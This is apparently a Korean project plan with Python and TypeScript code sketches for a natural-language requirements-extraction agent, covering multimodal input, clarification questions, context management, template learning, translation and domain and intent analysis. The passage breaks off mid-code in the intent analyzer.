# Phase 4: 9개 핵심 에이전트 구현 - Part 1 (Tasks 4.1-4.2)

## 1. NL Input Agent (자연어 입력 에이전트)

### Task 4.1: NL Input Agent 코어 구현

#### SubTask 4.1.1: Agno 기반 NL 처리 엔진 구현

**담당자**: 시니어 NLP 엔지니어  
**예상 소요시간**: 16시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_input_agent.py
from agno.agent import Agent
from agno.models.aws import AwsBedrock
from agno.memory import ConversationSummaryMemory
from typing import Dict, List, Any, Optional
from dataclasses import dataclass

@dataclass
class ProjectRequirements:
    description: str
    project_type: str
    technical_requirements: List[str]
    non_functional_requirements: List[str]
    technology_preferences: Dict[str, Any]
    constraints: List[str]
    extracted_entities: Dict[str, Any]

class NLInputAgent:
    """자연어 프로젝트 설명을 분석하고 요구사항을 추출하는 에이전트"""

    def __init__(self):
        self.agent = Agent(
            name="NL-Input-Processor",
            model=AwsBedrock(
                id="anthropic.claude-3-sonnet-v2:0",
                region="us-east-1"
            ),
            role="Senior requirements analyst specializing in software project analysis",
            instructions=[
                "프로젝트 설명에서 핵심 요구사항을 추출",
                "기술적/비기술적 요구사항을 구분",
                "프로젝트 유형과 규모를 파악",
                "선호 기술 스택과 제약사항을 식별",
                "모호한 부분에 대해 명확화 질문 생성"
            ],
            memory=ConversationSummaryMemory(
                storage_type="dynamodb",
                table_name="t-dev-nl-conversations"
            ),
            tools=[
                ProjectTypeClassifier(),
                TechStackAnalyzer(),
                RequirementExtractor(),
                EntityRecognizer()
            ],
            temperature=0.3,
            max_retries=3
        )

        self.context_enhancer = ContextEnhancer()
        self.validation_engine = RequirementValidator()

    async def process_description(self, description: str, context: Optional[Dict] = None) -> ProjectRequirements:
        """자연어 프로젝트 설명 처리"""

        # 1. 컨텍스트 향상
        enhanced_input = await self.context_enhancer.enhance(description, context)

        # 2. 초기 분석
        analysis_prompt = f"""
        다음 프로젝트 설명을 분석하고 요구사항을 추출하세요:

        설명: {enhanced_input}

        추출해야 할 항목:
        1. 프로젝트 유형 (웹앱, 모바일앱, API, CLI 도구 등)
        2. 핵심 기능 요구사항
        3. 기술적 요구사항
        4. 성능/보안 등 비기능적 요구사항
        5. 선호하는 기술 스택
        6. 제약사항이나 특별 요구사항
        7. 타겟 사용자와 사용 시나리오
        """

        initial_analysis = await self.agent.arun(analysis_prompt)

        # 3. 구조화된 데이터로 변환
        structured_data = await self._parse_analysis(initial_analysis)

        # 4. 검증 및 보완
        validated_requirements = await self.validation_engine.validate(structured_data)

        # 5. 불명확한 부분 식별
        if validated_requirements.has_ambiguities:
            clarification_questions = await self._generate_clarification_questions(
                validated_requirements.ambiguities
            )
            # 사용자에게 질문 반환 (별도 처리)

        return ProjectRequirements(**validated_requirements.data)
```

**검증 기준**:

- [ ] 자연어 입력을 구조화된 요구사항으로 변환
- [ ] 프로젝트 유형 정확히 식별 (95% 이상 정확도)
- [ ] 기술적/비기술적 요구사항 구분
- [ ] 모호한 부분에 대한 명확화 질문 생성

#### SubTask 4.1.2: 멀티모달 입력 처리 시스템

**담당자**: AI 엔지니어  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_input_multimodal.py
from agno.tools import ImageAnalyzer, PDFExtractor
from typing import Union, List
import base64

class MultimodalInputProcessor:
    """텍스트, 이미지, 문서 등 다양한 형식의 입력 처리"""

    def __init__(self, nl_agent: NLInputAgent):
        self.nl_agent = nl_agent
        self.image_analyzer = ImageAnalyzer()
        self.pdf_extractor = PDFExtractor()
        self.diagram_interpreter = DiagramInterpreter()

    async def process_multimodal_input(
        self,
        inputs: List[Union[str, bytes, 'UploadedFile']]
    ) -> ProjectRequirements:
        """멀티모달 입력 처리 및 통합"""

        extracted_texts = []
        diagrams = []

        for input_item in inputs:
            if isinstance(input_item, str):
                extracted_texts.append(input_item)

            elif self._is_image(input_item):
                # 이미지에서 다이어그램이나 UI 목업 분석
                analysis = await self.image_analyzer.analyze(input_item)
                if analysis.contains_diagram:
                    diagram_info = await self.diagram_interpreter.interpret(
                        input_item,
                        diagram_type=analysis.diagram_type
                    )
                    diagrams.append(diagram_info)
                extracted_texts.append(analysis.extracted_text)

            elif self._is_document(input_item):
                # PDF, Word 등 문서에서 텍스트 추출
                doc_content = await self.pdf_extractor.extract(input_item)
                extracted_texts.append(doc_content.text)
                diagrams.extend(doc_content.diagrams)

        # 모든 추출된 정보 통합
        combined_description = self._combine_extracted_info(
            texts=extracted_texts,
            diagrams=diagrams
        )

        # NL 에이전트로 처리
        return await self.nl_agent.process_description(
            combined_description,
            context={"has_diagrams": len(diagrams) > 0}
        )

    def _combine_extracted_info(
        self,
        texts: List[str],
        diagrams: List[Dict]
    ) -> str:
        """추출된 정보를 통합하여 하나의 설명으로 만들기"""

        combined = "\n\n".join(texts)

        if diagrams:
            combined += "\n\n### 다이어그램 정보:\n"
            for i, diagram in enumerate(diagrams):
                combined += f"\n{i+1}. {diagram['type']}: {diagram['description']}"
                if 'components' in diagram:
                    combined += f"\n   컴포넌트: {', '.join(diagram['components'])}"
                if 'relationships' in diagram:
                    combined += f"\n   관계: {', '.join(diagram['relationships'])}"

        return combined

    def _is_image(self, input_item: Union[bytes, 'UploadedFile']) -> bool:
        """이미지 파일 여부 확인"""
        if hasattr(input_item, 'content_type'):
            return input_item.content_type.startswith('image/')
        # 매직 바이트 확인
        if isinstance(input_item, bytes):
            return (input_item[:4] == b'\xff\xd8\xff\xe0' or  # JPEG
                   input_item[:8] == b'\x89PNG\r\n\x1a\n')    # PNG
        return False
```

**검증 기준**:

- [ ] 텍스트, 이미지, PDF 입력 처리 가능
- [ ] 다이어그램에서 구조 정보 추출
- [ ] 여러 입력 소스 통합 처리
- [ ] 오류 처리 및 폴백 메커니즘

#### SubTask 4.1.3: 요구사항 명확화 시스템

**담당자**: 백엔드 개발자  
**예상 소요시간**: 10시간

**작업 내용**:

```typescript
// backend/src/agents/implementations/requirement-clarification.ts
interface ClarificationQuestion {
  id: string;
  category: string;
  question: string;
  options?: string[];
  required: boolean;
  impact: "high" | "medium" | "low";
}

class RequirementClarificationSystem {
  private nlAgent: NLInputAgent;
  private questionGenerator: QuestionGenerator;

  async identifyAmbiguities(
    requirements: ProjectRequirements
  ): Promise<Ambiguity[]> {
    const ambiguities: Ambiguity[] = [];

    // 1. 기술 스택 모호성 검사
    if (!requirements.technology_preferences.frontend) {
      ambiguities.push({
        type: "missing_tech_choice",
        field: "frontend_framework",
        severity: "high",
      });
    }

    // 2. 규모 및 성능 요구사항 검사
    if (
      !requirements.non_functional_requirements.find((r) => r.includes("users"))
    ) {
      ambiguities.push({
        type: "missing_scale_info",
        field: "expected_user_count",
        severity: "medium",
      });
    }

    // 3. 보안 요구사항 검사
    if (!this.hasSecurityRequirements(requirements)) {
      ambiguities.push({
        type: "missing_security_info",
        field: "authentication_method",
        severity: "high",
      });
    }

    return ambiguities;
  }

  async generateClarificationQuestions(
    ambiguities: Ambiguity[]
  ): Promise<ClarificationQuestion[]> {
    const questions: ClarificationQuestion[] = [];

    for (const ambiguity of ambiguities) {
      const question = await this.questionGenerator.generate(ambiguity);
      questions.push(question);
    }

    // 우선순위 정렬
    return questions.sort((a, b) => {
      const priorityMap = { high: 3, medium: 2, low: 1 };
      return priorityMap[b.impact] - priorityMap[a.impact];
    });
  }

  async processUserResponses(
    questions: ClarificationQuestion[],
    responses: Map<string, any>
  ): Promise<RefinedRequirements> {
    const refinedRequirements = new RefinedRequirements();

    for (const question of questions) {
      const response = responses.get(question.id);
      if (response) {
        await this.applyResponse(refinedRequirements, question, response);
      }
    }

    return refinedRequirements;
  }
}
```

**검증 기준**:

- [ ] 모호한 요구사항 자동 식별
- [ ] 맥락에 맞는 명확화 질문 생성
- [ ] 사용자 응답 처리 및 요구사항 업데이트
- [ ] 우선순위 기반 질문 순서 결정

#### SubTask 4.1.4: NL Agent 테스트 및 벤치마크

**담당자**: QA 엔지니어  
**예상 소요시간**: 8시간

**작업 내용**:

```python
# backend/tests/agents/test_nl_input_agent.py
import pytest
from unittest.mock import Mock, patch
import asyncio

class TestNLInputAgent:
    """NL Input Agent 종합 테스트"""

    @pytest.fixture
    def nl_agent(self):
        return NLInputAgent()

    @pytest.fixture
    def test_descriptions(self):
        return {
            "simple_web": "간단한 할일 관리 웹 애플리케이션을 만들어주세요",
            "complex_mobile": """
            iOS와 Android를 지원하는 소셜 미디어 앱을 개발해주세요.
            사용자는 사진과 동영상을 업로드하고, 친구들과 공유할 수 있어야 합니다.
            실시간 채팅 기능과 푸시 알림이 필요하고, 100만 명 이상의 사용자를 지원해야 합니다.
            """,
            "api_service": "RESTful API 서비스로 인증, 데이터 CRUD, 파일 업로드 기능 포함",
            "ambiguous": "좋은 앱 만들어주세요"
        }

    @pytest.mark.asyncio
    async def test_simple_project_extraction(self, nl_agent, test_descriptions):
        """간단한 프로젝트 설명 처리 테스트"""
        result = await nl_agent.process_description(test_descriptions["simple_web"])

        assert result.project_type == "web_application"
        assert "todo" in str(result.technical_requirements).lower()
        assert len(result.technical_requirements) > 0

    @pytest.mark.asyncio
    async def test_complex_requirements_extraction(self, nl_agent, test_descriptions):
        """복잡한 요구사항 추출 테스트"""
        result = await nl_agent.process_description(test_descriptions["complex_mobile"])

        assert result.project_type == "mobile_application"
        assert "iOS" in result.technology_preferences.get("platforms", [])
        assert "Android" in result.technology_preferences.get("platforms", [])
        assert any("real-time" in req.lower() for req in result.technical_requirements)
        assert any("1000000" in req or "million" in req for req in result.non_functional_requirements)

    @pytest.mark.asyncio
    async def test_ambiguous_input_handling(self, nl_agent, test_descriptions):
        """모호한 입력 처리 테스트"""
        with patch.object(nl_agent, '_generate_clarification_questions') as mock_questions:
            mock_questions.return_value = [
                {
                    "question": "어떤 종류의 앱을 원하시나요?",
                    "options": ["웹", "모바일", "데스크톱"]
                }
            ]

            result = await nl_agent.process_description(test_descriptions["ambiguous"])
            mock_questions.assert_called_once()

    @pytest.mark.benchmark
    async def test_performance_benchmark(self, nl_agent, test_descriptions, benchmark):
        """성능 벤치마크 테스트"""
        async def process_all():
            tasks = [
                nl_agent.process_description(desc)
                for desc in test_descriptions.values()
            ]
            return await asyncio.gather(*tasks)

        results = benchmark(lambda: asyncio.run(process_all()))
        assert len(results) == len(test_descriptions)
        # 평균 처리 시간이 2초 이하여야 함
        assert benchmark.stats['mean'] < 2.0
```

**검증 기준**:

- [ ] 모든 테스트 케이스 통과
- [ ] 평균 응답 시간 2초 이하
- [ ] 정확도 95% 이상
- [ ] 엣지 케이스 처리 검증

---

### Task 4.2: NL 컨텍스트 관리 시스템

#### SubTask 4.2.1: 대화 히스토리 관리

**담당자**: 백엔드 개발자  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_context_manager.py
from typing import List, Dict, Optional
from datetime import datetime, timedelta
import json

class ConversationContextManager:
    """NL Input Agent를 위한 대화 컨텍스트 관리"""

    def __init__(self, storage_client):
        self.storage = storage_client
        self.max_history_length = 50
        self.context_ttl = timedelta(hours=24)

    async def get_conversation_context(
        self,
        session_id: str,
        user_id: str
    ) -> ConversationContext:
        """세션별 대화 컨텍스트 조회"""

        # 현재 세션 컨텍스트
        current_context = await self.storage.get_item(
            table="conversation_contexts",
            key={"session_id": session_id}
        )

        # 사용자의 이전 프로젝트 컨텍스트
        user_history = await self.storage.query(
            table="conversation_contexts",
            index="user_id_index",
            key_condition="user_id = :uid",
            expression_values={":uid": user_id},
            limit=5
        )

        # 관련 프로젝트 패턴 분석
        patterns = await self._analyze_user_patterns(user_history)

        return ConversationContext(
            session_id=session_id,
            user_id=user_id,
            current_messages=current_context.get("messages", []),
            user_preferences=patterns.get("preferences", {}),
            common_requirements=patterns.get("common_requirements", []),
            technology_stack_history=patterns.get("tech_stacks", [])
        )

    async def update_context(
        self,
        session_id: str,
        message: Dict[str, Any],
        extracted_info: Optional[Dict[str, Any]] = None
    ):
        """대화 컨텍스트 업데이트"""

        context = await self.get_conversation_context(session_id, message["user_id"])

        # 메시지 추가
        context.current_messages.append({
            "timestamp": datetime.utcnow().isoformat(),
            "role": message["role"],
            "content": message["content"],
            "extracted_info": extracted_info
        })

        # 히스토리 크기 관리
        if len(context.current_messages) > self.max_history_length:
            # 오래된 메시지 요약
            summary = await self._summarize_old_messages(
                context.current_messages[:10]
            )
            context.current_messages = [summary] + context.current_messages[10:]

        # 저장
        await self.storage.put_item(
            table="conversation_contexts",
            item={
                "session_id": session_id,
                "user_id": message["user_id"],
                "messages": context.current_messages,
                "last_updated": datetime.utcnow().isoformat(),
                "ttl": int((datetime.utcnow() + self.context_ttl).timestamp())
            }
        )

    async def _analyze_user_patterns(
        self,
        user_history: List[Dict]
    ) -> Dict[str, Any]:
        """사용자의 프로젝트 패턴 분석"""

        patterns = {
            "preferences": {},
            "common_requirements": [],
            "tech_stacks": []
        }

        if not user_history:
            return patterns

        # 기술 스택 빈도 분석
        tech_stack_frequency = {}
        for project in user_history:
            if 'extracted_info' in project and 'tech_stack' in project['extracted_info']:
                for tech in project['extracted_info']['tech_stack']:
                    tech_stack_frequency[tech] = tech_stack_frequency.get(tech, 0) + 1

        # 상위 3개 기술 스택
        patterns["tech_stacks"] = sorted(
            tech_stack_frequency.items(),
            key=lambda x: x[1],
            reverse=True
        )[:3]

        # 공통 요구사항 패턴
        requirement_frequency = {}
        for project in user_history:
            if 'extracted_info' in project and 'requirements' in project['extracted_info']:
                for req in project['extracted_info']['requirements']:
                    req_key = self._normalize_requirement(req)
                    requirement_frequency[req_key] = requirement_frequency.get(req_key, 0) + 1

        # 2번 이상 나타난 요구사항
        patterns["common_requirements"] = [
            req for req, count in requirement_frequency.items()
            if count >= 2
        ]

        return patterns
```

**검증 기준**:

- [ ] 세션별 대화 이력 관리
- [ ] 사용자 패턴 분석 및 추천
- [ ] 대화 요약 기능
- [ ] TTL 기반 자동 정리

#### SubTask 4.2.2: 프로젝트 템플릿 학습 시스템

**담당자**: ML 엔지니어  
**예상 소요시간**: 14시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_template_learner.py
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.cluster import KMeans
import numpy as np

class ProjectTemplateLearner:
    """성공적인 프로젝트에서 패턴을 학습하여 템플릿 생성"""

    def __init__(self):
        self.vectorizer = TfidfVectorizer(max_features=1000)
        self.clustering_model = KMeans(n_clusters=20)
        self.templates: Dict[str, ProjectTemplate] = {}

    async def learn_from_successful_projects(
        self,
        projects: List[Project]
    ) -> Dict[str, ProjectTemplate]:
        """성공 프로젝트에서 템플릿 학습"""

        # 1. 프로젝트 설명 벡터화
        descriptions = [p.original_description for p in projects]
        vectors = self.vectorizer.fit_transform(descriptions)

        # 2. 클러스터링으로 유사 프로젝트 그룹화
        clusters = self.clustering_model.fit_predict(vectors)

        # 3. 각 클러스터에서 템플릿 추출
        for cluster_id in range(self.clustering_model.n_clusters):
            cluster_projects = [
                p for i, p in enumerate(projects)
                if clusters[i] == cluster_id
            ]

            if len(cluster_projects) >= 3:  # 최소 3개 프로젝트
                template = await self._extract_template(cluster_projects)
                self.templates[template.name] = template

        return self.templates

    async def _extract_template(
        self,
        projects: List[Project]
    ) -> ProjectTemplate:
        """프로젝트 그룹에서 공통 템플릿 추출"""

        # 공통 요구사항 추출
        common_requirements = self._find_common_elements(
            [p.requirements for p in projects]
        )

        # 공통 기술 스택
        common_tech_stack = self._find_common_elements(
            [p.tech_stack for p in projects]
        )

        # 평균 복잡도 및 규모
        avg_complexity = np.mean([p.complexity_score for p in projects])

        # 템플릿 이름 생성
        template_name = self._generate_template_name(
            common_requirements,
            common_tech_stack
        )

        return ProjectTemplate(
            name=template_name,
            description_pattern=self._extract_description_pattern(projects),
            common_requirements=common_requirements,
            recommended_tech_stack=common_tech_stack,
            typical_complexity=avg_complexity,
            success_rate=self._calculate_success_rate(projects),
            typical_timeline=self._calculate_typical_timeline(projects),
            common_challenges=self._extract_common_challenges(projects)
        )

    async def suggest_template(
        self,
        description: str
    ) -> Optional[ProjectTemplate]:
        """입력된 설명에 가장 적합한 템플릿 제안"""

        if not self.templates:
            return None

        # 설명 벡터화
        desc_vector = self.vectorizer.transform([description])

        # 가장 가까운 클러스터 찾기
        cluster_id = self.clustering_model.predict(desc_vector)[0]

        # 해당 클러스터의 템플릿 반환
        for template in self.templates.values():
            if template.cluster_id == cluster_id:
                return template

        return None

    def _find_common_elements(
        self,
        element_lists: List[List[str]]
    ) -> List[str]:
        """여러 리스트에서 공통 요소 찾기"""

        if not element_lists:
            return []

        # 모든 리스트에 나타나는 요소
        common = set(element_lists[0])
        for elements in element_lists[1:]:
            common = common.intersection(set(elements))

        # 빈도가 높은 순으로 정렬
        frequency = {}
        for elements in element_lists:
            for elem in elements:
                frequency[elem] = frequency.get(elem, 0) + 1

        return sorted(common, key=lambda x: frequency[x], reverse=True)
```

**검증 기준**:

- [ ] 프로젝트 클러스터링 정확도 85% 이상
- [ ] 템플릿 추천 적중률 80% 이상
- [ ] 실시간 학습 및 업데이트
- [ ] 템플릿 품질 검증 메커니즘

#### SubTask 4.2.3: 다국어 지원 시스템

**담당자**: NLP 엔지니어  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_multilingual.py
from typing import Dict, List, Tuple
import langdetect
from googletrans import Translator

class MultilingualNLProcessor:
    """다국어 프로젝트 설명 처리"""

    SUPPORTED_LANGUAGES = ['en', 'ko', 'ja', 'zh-cn', 'es', 'fr', 'de']

    def __init__(self, nl_agent: NLInputAgent):
        self.nl_agent = nl_agent
        self.translator = Translator()
        self.language_specific_processors = {
            'ko': KoreanProcessor(),
            'ja': JapaneseProcessor(),
            'zh-cn': ChineseProcessor()
        }

    async def process_multilingual_input(
        self,
        text: str,
        target_lang: str = 'en'
    ) -> Tuple[ProjectRequirements, Dict[str, Any]]:
        """다국어 입력 처리"""

        # 1. 언어 감지
        detected_lang = langdetect.detect(text)

        if detected_lang not in self.SUPPORTED_LANGUAGES:
            raise UnsupportedLanguageError(f"Language {detected_lang} is not supported")

        # 2. 언어별 전처리
        if detected_lang in self.language_specific_processors:
            preprocessed_text = await self.language_specific_processors[
                detected_lang
            ].preprocess(text)
        else:
            preprocessed_text = text

        # 3. 영어로 번역 (NL Agent는 영어로 학습됨)
        if detected_lang != 'en':
            translated_text = await self._translate_with_context(
                preprocessed_text,
                detected_lang,
                'en'
            )
            # 기술 용어 보존
            translated_text = self._preserve_technical_terms(
                original=preprocessed_text,
                translated=translated_text,
                source_lang=detected_lang
            )
        else:
            translated_text = preprocessed_text

        # 4. NL Agent 처리
        requirements = await self.nl_agent.process_description(translated_text)

        # 5. 결과를 원래 언어로 역번역 (선택적)
        localized_requirements = await self._localize_requirements(
            requirements,
            target_lang=detected_lang
        )

        return requirements, {
            "original_language": detected_lang,
            "processed_text": translated_text,
            "localized_output": localized_requirements
        }

    def _preserve_technical_terms(
        self,
        original: str,
        translated: str,
        source_lang: str
    ) -> str:
        """기술 용어 보존 처리"""

        # 언어별 기술 용어 사전
        tech_terms = {
            'ko': {
                '프론트엔드': 'frontend',
                '백엔드': 'backend',
                '데이터베이스': 'database',
                'API': 'API',
                '클라우드': 'cloud'
            },
            'ja': {
                'フロントエンド': 'frontend',
                'バックエンド': 'backend',
                'データベース': 'database'
            }
        }

        if source_lang in tech_terms:
            for original_term, english_term in tech_terms[source_lang].items():
                if original_term in original and english_term not in translated:
                    # 기술 용어가 잘못 번역된 경우 수정
                    translated = self._smart_replace(
                        translated,
                        original_term,
                        english_term
                    )

        return translated
```

**검증 기준**:

- [ ] 7개 언어 지원
- [ ] 기술 용어 보존율 95% 이상
- [ ] 번역 정확도 90% 이상
- [ ] 언어별 특수 처리 지원

#### SubTask 4.2.4: 실시간 피드백 처리

**담당자**: 백엔드 개발자  
**예상 소요시간**: 10시간

**작업 내용**:

```typescript
// backend/src/agents/implementations/nl-realtime-feedback.ts
import { EventEmitter } from "events";
import { WebSocket } from "ws";

interface FeedbackEvent {
  type: "clarification" | "correction" | "addition";
  content: string;
  timestamp: Date;
  processed: boolean;
}

class RealtimeFeedbackProcessor extends EventEmitter {
  private nlAgent: NLInputAgent;
  private feedbackQueue: FeedbackEvent[] = [];
  private processingLock: boolean = false;

  constructor(nlAgent: NLInputAgent) {
    super();
    this.nlAgent = nlAgent;
  }

  async handleRealtimeFeedback(
    sessionId: string,
    ws: WebSocket
  ): Promise<void> {
    ws.on("message", async (data: string) => {
      const feedback = JSON.parse(data) as FeedbackEvent;

      // 피드백 큐에 추가
      this.feedbackQueue.push(feedback);

      // 즉시 확인 응답
      ws.send(
        JSON.stringify({
          type: "feedback_received",
          id: feedback.id,
          status: "queued",
        })
      );

      // 피드백 처리
      if (!this.processingLock) {
        await this.processFeedbackQueue(sessionId, ws);
      }
    });
  }

  private async processFeedbackQueue(
    sessionId: string,
    ws: WebSocket
  ): Promise<void> {
    this.processingLock = true;

    while (this.feedbackQueue.length > 0) {
      const feedback = this.feedbackQueue.shift()!;

      try {
        // 피드백 유형별 처리
        let result;
        switch (feedback.type) {
          case "clarification":
            result = await this.processClarification(sessionId, feedback);
            break;
          case "correction":
            result = await this.processCorrection(sessionId, feedback);
            break;
          case "addition":
            result = await this.processAddition(sessionId, feedback);
            break;
        }

        // 처리 결과 전송
        ws.send(
          JSON.stringify({
            type: "feedback_processed",
            feedback_id: feedback.id,
            result: result,
            updated_requirements:
              await this.nlAgent.getCurrentRequirements(sessionId),
          })
        );
      } catch (error) {
        ws.send(
          JSON.stringify({
            type: "feedback_error",
            feedback_id: feedback.id,
            error: error.message,
          })
        );
      }
    }

    this.processingLock = false;
  }

  private async processClarification(
    sessionId: string,
    feedback: FeedbackEvent
  ): Promise<any> {
    // 명확화 응답 처리
    const context = await this.nlAgent.getContext(sessionId);
    const updatedRequirements = await this.nlAgent.refineRequirements(
      context.requirements,
      feedback.content,
      "clarification"
    );

    return {
      type: "requirements_refined",
      changes: this.diffRequirements(context.requirements, updatedRequirements),
    };
  }
}
```

**검증 기준**:

- [ ] WebSocket 기반 실시간 통신
- [ ] 피드백 큐잉 및 순차 처리
- [ ] 요구사항 즉시 업데이트
- [ ] 동시성 제어 및 오류 처리

---

# Phase 4: 9개 핵심 에이전트 구현 - Part 2 (Tasks 4.3-4.4)

## 1. NL Input Agent (자연어 입력 에이전트) - 계속

### Task 4.3: NL 에이전트 고급 기능

#### SubTask 4.3.1: 도메인 특화 언어 모델

**담당자**: ML 엔지니어  
**예상 소요시간**: 16시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_domain_specific.py
from transformers import AutoTokenizer, AutoModelForSequenceClassification
import torch

class DomainSpecificNLProcessor:
    """도메인별 특화 언어 처리"""

    DOMAIN_MODELS = {
        'fintech': 'finbert-base',
        'healthcare': 'biobert-base',
        'legal': 'legal-bert-base',
        'ecommerce': 'ecommerce-bert-base'
    }

    def __init__(self):
        self.domain_classifiers = {}
        self.domain_extractors = {}
        self._load_domain_models()

    def _load_domain_models(self):
        """도메인별 모델 로드"""
        for domain, model_name in self.DOMAIN_MODELS.items():
            self.domain_classifiers[domain] = DomainClassifier(model_name)
            self.domain_extractors[domain] = DomainSpecificExtractor(domain)

    async def process_domain_specific_requirements(
        self,
        description: str,
        detected_domain: Optional[str] = None
    ) -> DomainRequirements:
        """도메인 특화 요구사항 처리"""

        # 1. 도메인 자동 감지
        if not detected_domain:
            detected_domain = await self._detect_domain(description)

        if detected_domain not in self.domain_classifiers:
            # 일반 도메인으로 폴백
            return await self._process_general_domain(description)

        # 2. 도메인 특화 처리
        domain_classifier = self.domain_classifiers[detected_domain]
        domain_extractor = self.domain_extractors[detected_domain]

        # 3. 도메인별 엔티티 추출
        entities = await domain_extractor.extract_entities(description)

        # 4. 도메인별 요구사항 분류
        requirements = await domain_classifier.classify_requirements(
            description,
            entities
        )

        # 5. 도메인별 제약사항 및 규정 확인
        compliance_requirements = await self._check_domain_compliance(
            detected_domain,
            requirements
        )

        return DomainRequirements(
            domain=detected_domain,
            general_requirements=requirements.general,
            domain_specific_requirements=requirements.specific,
            entities=entities,
            compliance_requirements=compliance_requirements,
            recommended_architecture=self._get_domain_architecture(detected_domain),
            security_requirements=self._get_domain_security(detected_domain)
        )

    async def _detect_domain(self, description: str) -> str:
        """텍스트에서 도메인 자동 감지"""

        # 키워드 기반 초기 감지
        domain_keywords = {
            'fintech': ['payment', 'banking', 'transaction', 'finance', '금융', '결제'],
            'healthcare': ['patient', 'medical', 'health', 'diagnosis', '의료', '환자'],
            'ecommerce': ['shop', 'product', 'cart', 'order', '쇼핑', '상품'],
            'legal': ['contract', 'legal', 'law', 'compliance', '법률', '계약']
        }

        scores = {}
        for domain, keywords in domain_keywords.items():
            score = sum(1 for keyword in keywords if keyword.lower() in description.lower())
            scores[domain] = score

        # ML 모델을 통한 정밀 감지
        if max(scores.values()) > 0:
            top_domains = sorted(scores.items(), key=lambda x: x[1], reverse=True)[:2]

            # 상위 2개 도메인에 대해 ML 모델로 검증
            for domain, _ in top_domains:
                confidence = await self.domain_classifiers[domain].get_confidence(description)
                if confidence > 0.7:
                    return domain

        return 'general'

    def _get_domain_architecture(self, domain: str) -> Dict[str, Any]:
        """도메인별 추천 아키텍처"""

        architectures = {
            'fintech': {
                'pattern': 'microservices',
                'key_components': ['payment-gateway', 'fraud-detection', 'audit-log'],
                'data_storage': 'event-sourcing',
                'messaging': 'kafka',
                'security': 'zero-trust'
            },
            'healthcare': {
                'pattern': 'layered',
                'key_components': ['hl7-adapter', 'fhir-server', 'imaging-storage'],
                'data_storage': 'hybrid',
                'messaging': 'hl7-mllp',
                'security': 'hipaa-compliant'
            },
            'ecommerce': {
                'pattern': 'microservices',
                'key_components': ['product-catalog', 'inventory', 'checkout', 'recommendation'],
                'data_storage': 'polyglot',
                'messaging': 'event-driven',
                'security': 'pci-dss'
            }
        }

        return architectures.get(domain, {
            'pattern': 'modular-monolith',
            'key_components': [],
            'data_storage': 'relational',
            'messaging': 'rest',
            'security': 'standard'
        })
```

**검증 기준**:

- [ ] 도메인 감지 정확도 90% 이상
- [ ] 도메인별 특화 처리 구현
- [ ] 규정 준수 요구사항 자동 추가
- [ ] 도메인별 아키텍처 추천

#### SubTask 4.3.2: 의도 분석 및 목표 추출

**담당자**: NLP 전문가  
**예상 소요시간**: 12시간

**작업 내용**:

```typescript
// backend/src/agents/implementations/nl-intent-analyzer.ts
interface UserIntent {
  primary: IntentType;
  secondary: IntentType[];
  confidence: number;
  businessGoals: BusinessGoal[];
  technicalGoals: TechnicalGoal[];
  constraints: Constraint[];
}

enum IntentType {
  BUILD_NEW = "build_new",
  MIGRATE_EXISTING = "migrate_existing",
  MODERNIZE = "modernize",
  INTEGRATE = "integrate",
  OPTIMIZE = "optimize",
  FIX_ISSUES = "fix_issues",
}

interface BusinessGoal {
  type: string;
  description: string;
  measurableOutcome?: string;
  timeline?: string;
  priority: number;
}

interface TechnicalGoal {
  type: string;
  specification: string;
  currentState?: string;
  targetState: string;
  acceptanceCriteria: string[];
}

class IntentAnalyzer {
  private intentClassifier: IntentClassifier;
  private goalExtractor: GoalExtractor;
  private outcomePredictor: OutcomePredictor;

  async analyzeUserIntent(
    description: string,
    context?: ProjectContext
  ): Promise<UserIntent> {
    // 1. 주요 의도 분류
    const intents = await this.intentClassifier.classify(description);

    // 2. 비즈니스 목표 추출
    const businessGoals = await this.extractBusinessGoals(description);

    // 3. 기술적 목표 추출
    const technicalGoals = await this.extractTechnicalGoals(description);

    // 4. 제약사항 식별
    const constraints = await this.identifyConstraints(description);

    // 5. 의도 검증 및 정제
    const validatedIntent = await this.validateIntent(
      intents,
      businessGoals,
      technicalGoals,
      constraints
    );

    return validatedIntent;
  }

  private async extractBusinessGoals(
    description: string
  ): Promise<BusinessGoal[]> {
    const goals: BusinessGoal[] = [];

    // 비즈니스 목표 패턴
    const goalPatterns = [
      {
        pattern: /increase\s+(\w+)\s+by\s+(\d+%?)/gi,
        type: "growth",
        extractor: (match: RegExpMatchArray) => ({
          type: "growth",
          description: `Increase ${match[1]} by ${match[2]}`,
          measurableOutcome: match[2],
          priority: 1,
        }),
      },
      {
        pattern: /reduce\s+(\w+)\s+(?:by\s+)?(\d+%?)?/gi,
        type: "efficiency",
        extractor: (match: RegExpMatchArray) => ({
          type: "efficiency",
          description: `Reduce ${match[1]}${match[2] ? " by " + match[2] : ""}`,
          measurableOutcome: match[2] || "significant reduction",
          priority: 1,
        }),
      },
      {
        pattern: /automate\s+(.+?)(?:\.|,|$)/gi,
        type: "automation",
        extractor: (match: RegExpMatchArray) => ({
          type: "automation",
          description: `Automate ${match[1]}`,
          measurableOutcome: "process automation",
          priority: 2,
        }),
      },
    ];

    // 패턴 매칭
    for (const { pattern, type, extractor } of goalPatterns) {
      let match;
      while ((match = pattern.exec(description)) !== null) {
        goals.push(extractor(match));
      }
    }

    // AI 기반 추가 목표 추출
    const aiExtractedGoals = await this.goalExtractor.extractGoals(description);
    goals.push(...aiExtractedGoals);

    // 중복 제거 및 우선순위 정렬
    return this.deduplicateAndPrioritize(goals);
  }

  private async extractTechnicalGoals(
    description: string
  ): Promise<TechnicalGoal[]> {
    const technicalGoals: TechnicalGoal[] = [];

    // 성능 목표
    const performanceMatch = description.match(
      /(?:handle|support|serve)\s+(\d+)\s*(k|m|million)?\s*(?:users?|requests?|transactions?)/i
    );

    if (performanceMatch) {
      const count = parseInt(performanceMatch[1]);
      const multiplier =
        performanceMatch[2] === "k"
          ? 1000
          : performanceMatch[2] === "m" || performanceMatch[2] === "million"
            ? 1000000
            : 1;

      technicalGoals.push({
        type: "performance",
        specification: `Support ${count * multiplier} concurrent users/requests`,
        targetState: `${count * multiplier} RPS`,
        acceptanceCriteria: [
